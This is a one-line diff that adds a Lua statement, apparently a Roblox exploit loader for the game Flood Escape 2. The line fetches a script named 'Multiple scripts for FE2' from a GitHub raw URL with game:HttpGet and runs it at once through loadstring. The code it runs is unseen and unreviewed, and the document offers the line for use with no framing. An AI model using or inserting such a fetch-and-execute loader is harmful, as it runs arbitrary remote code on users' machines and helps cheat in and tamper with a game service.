@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Ruinins/scripts/main/Multiple%20scripts%20for%20FE2.lua'))()
